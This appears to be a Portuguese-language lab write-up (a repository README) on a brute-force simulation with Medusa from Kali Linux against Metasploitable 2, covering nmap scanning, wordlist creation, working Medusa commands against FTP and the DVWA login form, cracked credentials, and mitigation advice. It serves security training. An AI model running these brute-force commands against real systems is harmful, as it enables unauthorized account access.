
# Simulação de Ataque Brute Force com Medusa

Este repositório documenta uma simulação prática de ataque de força bruta utilizando a ferramenta **Medusa** no Kali Linux, tendo como alvo uma máquina Metasploitable 2.

O objetivo do estudo é compreender técnicas de pós-coleta de informações, exploração de serviços, validação de credenciais e ataque de autenticação em serviços como **FTP** e **HTTP (DVWA)**, em um ambiente educacional e controlado.

## Ambiente Utilizado

A simulação foi realizada em um ambiente virtualizado, isolado e controlado, conforme a tabela abaixo:

| Componente | Descrição | 
| ----- | ----- | 
| **Host atacante** | Kali Linux (via VirtualBox) | 
| **Host alvo** | Metasploitable 2 (via VirtualBox) | 
| **Ferramentas** | Medusa, Nmap, FTP client | 
| **Rede** | Host-Only / 192.168.56.0/24 | 

## Fluxo do Ataque

O ataque seguiu as seguintes etapas:

### 1. Verificação de Conectividade

Primeiramente, foi testada a comunicação entre o Kali Linux e o Metasploitable 2 para garantir que o alvo estava ativo na rede.

`ping 192.168.56.102`


**Resultado:** `host ativo, sem perda de pacotes.`

Em seguida, um ping limitado a 3 pacotes:

`ping -c 3 192.168.56.102`


### 2. Varredura Nmap (Descoberta de Serviços)

Utilizando o Nmap, foram identificados os serviços importantes expostos e rodando no Metasploitable 2, focando nas portas de serviços de autenticação comuns.

`nmap -sV -p 21,22,80,445,139 192.168.56.102`


**Serviços detectados:**

* **FTP** — `vsftpd 2.3.4` (Porta 21)

* **SSH** — `OpenSSH 4.7p1` (Porta 22)

* **HTTP** — `Apache 2.2.8` (Porta 80)

* **Samba** — portas 139 e 445

Esses serviços foram posteriormente visados para tentativas de autenticação de força bruta.

### 3. Teste Manual de FTP

Um teste inicial de autenticação manual no serviço FTP confirmou a necessidade de um ataque automatizado para descobrir credenciais válidas.

`ftp 192.168.56.102`


*Tentativa usando o usuário `admin` resultou em falha.*

### 4. Criação das Wordlists

Foram criadas listas de usuários e senhas (wordlists) simples para a simulação:

**Lista de Usuários (`users.txt`)**

`echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt`


**Lista de Senhas (`pass.txt`)**

`echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt`


### 5. Ataque Brute Force com Medusa (Serviço FTP)

O ataque de força bruta foi executado contra o serviço FTP usando o Medusa e as wordlists criadas.

**Execução:**

`medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6`


**Credencial encontrada:**

* `User: msfadmin`

* `Pass: msfadmin`

A credencial foi validada manualmente:

`ftp 192.168.56.102`


**Resultado:** `Login successful.`

### 6. Brute Force via HTTP (DVWA)

O ataque foi replicado contra a página de login da aplicação web DVWA (Damn Vulnerable Web Application) rodando na porta 80. Foi usada uma nova lista de usuários para incluir variações.

**Execução:**
```
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http

-m PAGE:'/dvwa/login.php'

-m FORM:'username=^USER^&password=^PASS^&Login=Login'

-m 'FAIL=Login failed' -t 6
```

**Credenciais válidas encontradas:**
Diversas credenciais foram encontradas como válidas, evidenciando falhas na política de senhas da aplicação, incluindo:

* `adminmsfadmin : password`

* `a user : msfadmin`

* `admin : 123456`

* `root : 123456`

* `root : password`

* `a user : password`

* `a user : qwerty`

## 7. Conclusões

A simulação demonstrou a extrema vulnerabilidade do sistema Metasploitable 2, que é intencionalmente inseguro. As principais lições de segurança evidenciadas são:

1. **Falta de Proteção contra Brute Force:** Serviços expostos (FTP, HTTP) não possuíam mecanismos de proteção contra ataques automatizados.

2. **Credenciais Fracas:** A facilidade e rapidez com que credenciais comuns (e até mesmo o padrão `msfadmin:msfadmin`) foram quebradas sublinha a importância de políticas de senhas robustas.

### Recomendações de Segurança

Para mitigar esse tipo de ataque, é crucial implementar as seguintes medidas:

* **Políticas de Senhas Fortes:** Forçar o uso de senhas longas e complexas.

* **Mecanismos de Lockout:** Implementar bloqueio de conta após um pequeno número de tentativas falhas (ex: 5).

* **Limitação de Exposição de Serviços:** Limitar a exposição de serviços de rede apenas ao necessário, usando firewalls ou listas de acesso.

* **Controles Web Adicionais:** Adicionar CAPTCHA, Limitação de Taxa de Requisições (Rate Limiting) ou Autenticação de Dois Fatores (2FA) em portais web.

Este projeto demonstra, em ambiente controlado e educacional, como ataques relativamente simples podem comprometer sistemas mal configurados.

## 8. Como executar o script de simulação
O script `run_bruteforce_simulation.sh` automatiza as etapas de 1 a 6 desta simulação (excluindo os testes de validação manual).

**Pré-requisitos**

Certifique-se de que o Kali Linux e a máquina Metasploitable 2 estejam ativos na rede 192.168.56.0/24 e que o Medusa e o Nmap estejam instalados.

**Execução:** Conceda permissão de execução ao script:

`chmod +x run_bruteforce_simulation.sh`

**Execute o script:**

`./run_bruteforce_simulation.sh`

O script limpará as listas de palavras (`users.txt` e `pass.txt`) após a conclusão.
